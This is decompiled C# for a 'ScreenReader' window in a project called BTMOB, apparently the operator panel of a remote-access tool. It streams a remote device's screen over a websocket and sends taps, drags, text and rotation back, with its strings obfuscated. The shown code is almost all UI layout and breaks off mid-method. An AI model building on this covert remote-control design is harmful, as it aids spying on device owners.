using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace BTMOB;

[DesignerGenerated]
public class ScreenReader : basestyle
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__96_002D0
	{
		public string _0024VB_0024Local_datastr;

		public ScreenReader _0024VB_0024Me;

		public _Closure_0024__96_002D0(_Closure_0024__96_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_datastr = arg0._0024VB_0024Local_datastr;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Me.websockclient.Connect(_0024VB_0024Local_datastr);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("viewimage")]
	private PictureBox _viewimage;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon11")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon11;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon10")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon10;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon9")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("inputtext")]
	private DrakeUITextBox _inputtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private System.Windows.Forms.Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("zoom_in")]
	private DrakeUIButtonIcon _zoom_in;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("zoom_out")]
	private DrakeUIButtonIcon _zoom_out;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("coloskeletonpick")]
	private DrakeUIColorPicker _coloskeletonpick;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("saveit")]
	private DrakeUIButtonIcon _saveit;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savetimer")]
	private System.Windows.Forms.Timer _savetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("startbtn")]
	private DrakeUIButtonIcon _startbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("stopbtn")]
	private DrakeUIButtonIcon _stopbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("autorotbtn")]
	private DrakeUIButtonIcon _autorotbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("switchmod")]
	private DrakeUIButtonIcon _switchmod;

	public BTClient Btcli;

	public int FPS;

	private WebSocketClient websockclient;

	public Size screenSize;

	public string screenorinta;

	public string Lastrotate;

	private bool isDown;

	private bool isClick;

	private int startX;

	private int startY;

	private List<Point> trackPoints;

	private int dragThreshold;

	public bool boSave;

	public bool newphoto;

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox viewimage
	{
		[CompilerGenerated]
		get
		{
			return _viewimage;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = viewimage_MouseDown;
			MouseEventHandler value3 = viewimage_MouseMove;
			MouseEventHandler value4 = viewimage_MouseUp;
			PictureBox pictureBox = _viewimage;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
				pictureBox.MouseMove -= value3;
				pictureBox.MouseUp -= value4;
			}
			_viewimage = value;
			pictureBox = _viewimage;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
				pictureBox.MouseMove += value3;
				pictureBox.MouseUp += value4;
			}
		}
	}

	[field: AccessedThroughProperty("TableLayoutPanel1")]
	internal virtual TableLayoutPanel TableLayoutPanel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon11
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon11_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon11;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon11 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon11;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon10
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon10_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon10;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon10 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon10;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon9
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon9_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon9;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon9 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon9;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUITextBox inputtext
	{
		[CompilerGenerated]
		get
		{
			return _inputtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			KeyEventHandler value2 = inputtext_KeyDown;
			DrakeUITextBox drakeUITextBox = _inputtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.KeyDown -= value2;
			}
			_inputtext = value;
			drakeUITextBox = _inputtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.KeyDown += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			System.Windows.Forms.Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon zoom_in
	{
		[CompilerGenerated]
		get
		{
			return _zoom_in;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ctrlbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _zoom_in;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_zoom_in = value;
			drakeUIButtonIcon = _zoom_in;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon zoom_out
	{
		[CompilerGenerated]
		get
		{
			return _zoom_out;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = zoom_out_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _zoom_out;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_zoom_out = value;
			drakeUIButtonIcon = _zoom_out;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIColorPicker coloskeletonpick
	{
		[CompilerGenerated]
		get
		{
			return _coloskeletonpick;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIColorPicker.OnColorChanged value2 = coloskeletonpick_ValueChanged;
			DrakeUIColorPicker drakeUIColorPicker = _coloskeletonpick;
			if (drakeUIColorPicker != null)
			{
				drakeUIColorPicker.ValueChanged -= value2;
			}
			_coloskeletonpick = value;
			drakeUIColorPicker = _coloskeletonpick;
			if (drakeUIColorPicker != null)
			{
				drakeUIColorPicker.ValueChanged += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon saveit
	{
		[CompilerGenerated]
		get
		{
			return _saveit;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = saveit_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _saveit;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_saveit = value;
			drakeUIButtonIcon = _saveit;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer savetimer
	{
		[CompilerGenerated]
		get
		{
			return _savetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = savetimer_Tick;
			System.Windows.Forms.Timer timer = _savetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_savetimer = value;
			timer = _savetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon startbtn
	{
		[CompilerGenerated]
		get
		{
			return _startbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = startbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _startbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_startbtn = value;
			drakeUIButtonIcon = _startbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon stopbtn
	{
		[CompilerGenerated]
		get
		{
			return _stopbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = stopbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _stopbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_stopbtn = value;
			drakeUIButtonIcon = _stopbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon autorotbtn
	{
		[CompilerGenerated]
		get
		{
			return _autorotbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = autorotbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _autorotbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_autorotbtn = value;
			drakeUIButtonIcon = _autorotbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon switchmod
	{
		[CompilerGenerated]
		get
		{
			return _switchmod;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _switchmod;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_switchmod = value;
			drakeUIButtonIcon = _switchmod;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public ScreenReader()
	{
		base.Load += ScreenReader_Load;
		base.Closing += ScreenReader_Closing;
		base.FormClosing += ScreenReader_FormClosing;
		FPS = 0;
		websockclient = null;
		screenSize = default(Size);
		screenorinta = EXGuarder._1B2F1073;
		Lastrotate = EXGuarder._6F50104F;
		isDown = false;
		isClick = false;
		trackPoints = new List<Point>();
		dragThreshold = 5;
		boSave = false;
		newphoto = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.ScreenReader));
		this.Panel2 = new System.Windows.Forms.Panel();
		this.coloskeletonpick = new DrakeUI.Framework.DrakeUIColorPicker();
		this.stopbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.startbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.saveit = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.viewimage = new System.Windows.Forms.PictureBox();
		this.TableLayoutPanel1 = new System.Windows.Forms.TableLayoutPanel();
		this.DrakeUIButtonIcon11 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon10 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon9 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.inputtext = new DrakeUI.Framework.DrakeUITextBox();
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		this.Panel3 = new System.Windows.Forms.Panel();
		this.switchmod = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.zoom_out = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.zoom_in = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.autorotbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.savetimer = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.viewimage).BeginInit();
		this.TableLayoutPanel1.SuspendLayout();
		this.Panel3.SuspendLayout();
		base.SuspendLayout();
		this.myscr.Size = new System.Drawing.Size(46, 25);
		this.myscr.Visible = false;
		this.pinbtn.Location = new System.Drawing.Point(322, 5);
		this.minibtn.Location = new System.Drawing.Point(364, 5);
		this.closbtn.Location = new System.Drawing.Point(406, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(438, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(448, 26);
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.coloskeletonpick);
		this.Panel2.Controls.Add(this.stopbtn);
		this.Panel2.Controls.Add(this.DrakeWidth_W3);
		this.Panel2.Controls.Add(this.startbtn);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(2, 64);
		this.Panel2.Name = EXGuarder._5719576A;
		this.Panel2.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.Panel2.Size = new System.Drawing.Size(448, 40);
		this.Panel2.TabIndex = 40;
		this.coloskeletonpick.Dock = System.Windows.Forms.DockStyle.Left;
		this.coloskeletonpick.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.coloskeletonpick.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.coloskeletonpick.Font = new System.Drawing.Font(EXGuarder._21372768, 12f);
		this.coloskeletonpick.Location = new System.Drawing.Point(5, 4);
		this.coloskeletonpick.Margin = new System.Windows.Forms.Padding(4);
		this.coloskeletonpick.MinimumSize = new System.Drawing.Size(56, 0);
		this.coloskeletonpick.Name = EXGuarder._09606148;
		this.coloskeletonpick.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.coloskeletonpick.Radius = 10;
		this.coloskeletonpick.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.coloskeletonpick.RectColor = System.Drawing.Color.Gray;
		this.coloskeletonpick.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.coloskeletonpick.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom;
		this.coloskeletonpick.Size = new System.Drawing.Size(68, 31);
		this.coloskeletonpick.Style = DrakeUI.Framework.UIStyle.Custom;
		this.coloskeletonpick.TabIndex = 52;
		this.coloskeletonpick.Text = EXGuarder._6D4A4012;
		this.coloskeletonpick.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.coloskeletonpick.Value = System.Drawing.Color.FromArgb(2, 176, 117);
		this.coloskeletonpick.Watermark = EXGuarder._09041D26;
		this.stopbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.stopbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.stopbtn.Enabled = false;
		this.stopbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stopbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.Font = new System.Drawing.Font(EXGuarder._21372768, 9f);
		this.stopbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.stopbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.stopbtn.Location = new System.Drawing.Point(326, 4);
		this.stopbtn.Name = EXGuarder._13011632;
		this.stopbtn.Radius = 15;
		this.stopbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.stopbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.stopbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.stopbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom;
		this.stopbtn.Size = new System.Drawing.Size(54, 32);
		this.stopbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.stopbtn.Symbol = 61516;
		this.stopbtn.SymbolSize = 18;
		this.stopbtn.TabIndex = 39;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(380, 4);
		this.DrakeWidth_W3.Name = EXGuarder._113B6D5E;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(9, 32);
		this.DrakeWidth_W3.TabIndex = 36;
		this.startbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.startbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.startbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.startbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.startbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.Font = new System.Drawing.Font(EXGuarder._21372768, 9f);
		this.startbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.startbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.startbtn.Location = new System.Drawing.Point(389, 4);
		this.startbtn.Name = EXGuarder._60022344;
		this.startbtn.Radius = 15;
		this.startbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.startbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.startbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.startbtn.Size = new System.Drawing.Size(54, 32);
		this.startbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.startbtn.Symbol = 61515;
		this.startbtn.SymbolSize = 18;
		this.startbtn.TabIndex = 38;
		this.saveit.Cursor = System.Windows.Forms.Cursors.Hand;
		this.saveit.Dock = System.Windows.Forms.DockStyle.Left;
		this.saveit.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.saveit.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.saveit.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.saveit.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.saveit.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.saveit.Font = new System.Drawing.Font(EXGuarder._21372768, 9f);
		this.saveit.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.saveit.ForeHoverColor = System.Drawing.Color.Gray;
		this.saveit.Location = new System.Drawing.Point(156, 0);
		this.saveit.Name = EXGuarder._6D777830;
		this.saveit.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.saveit.RectColor = System.Drawing.Color.Gray;
		this.saveit.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.saveit.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.saveit.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.saveit.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.saveit.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.saveit.Size = new System.Drawing.Size(52, 40);
		this.saveit.Style = DrakeUI.Framework.UIStyle.Custom;
		this.saveit.Symbol = 57572;
		this.saveit.TabIndex = 37;
		this.saveit.Tag = EXGuarder._4C4E6D23;
		this.viewimage.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.viewimage.Dock = System.Windows.Forms.DockStyle.Fill;
		this.viewimage.Location = new System.Drawing.Point(2, 144);
		this.viewimage.Name = EXGuarder._1E42744C;
		this.viewimage.Size = new System.Drawing.Size(448, 794);
		this.viewimage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.viewimage.TabIndex = 41;
		this.viewimage.TabStop = false;
		this.TableLayoutPanel1.ColumnCount = 3;
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel1.Controls.Add(this.DrakeUIButtonIcon11, 0, 0);
		this.TableLayoutPanel1.Controls.Add(this.DrakeUIButtonIcon10, 0, 0);
		this.TableLayoutPanel1.Controls.Add(this.DrakeUIButtonIcon9, 0, 0);
		this.TableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.TableLayoutPanel1.Location = new System.Drawing.Point(2, 938);
		this.TableLayoutPanel1.Name = EXGuarder._503E4F00;
		this.TableLayoutPanel1.RowCount = 1;
		this.TableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
		this.TableLayoutPanel1.Size = new System.Drawing.Size(448, 27);
		this.TableLayoutPanel1.TabIndex = 49;
		this.DrakeUIButtonIcon11.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon11.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUIButtonIcon11.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.Font = new System.Drawing.Font(EXGuarder._21372768, 9f);
		this.DrakeUIButtonIcon11.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon11.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon11.Location = new System.Drawing.Point(301, 3);
		this.DrakeUIButtonIcon11.Name = EXGuarder._586D0965;
		this.DrakeUIButtonIcon11.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon11.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon11.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon11.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon11.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon11.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon11.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon11.Size = new System.Drawing.Size(144, 21);
		this.DrakeUIButtonIcon11.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon11.Symbol = 61540;
		this.DrakeUIButtonIcon11.TabIndex = 23;
		this.DrakeUIButtonIcon10.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon10.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUIButtonIcon10.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.Font = new System.Drawing.Font(EXGuarder._21372768, 9f);
		this.DrakeUIButtonIcon10.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon10.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon10.Location = new System.Drawing.Point(152, 3);
		this.DrakeUIButtonIcon10.Name = EXGuarder._3B231364;
		this.DrakeUIButtonIcon10.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon10.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon10.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon10.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon10.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon10.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon10.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon10.Size = new System.Drawing.Size(143, 21);
		this.DrakeUIButtonIcon10.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon10.Symbol = 57460;
		this.DrakeUIButtonIcon10.TabIndex = 22;
		this.DrakeUIButtonIcon9.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon9.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUIButtonIcon9.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
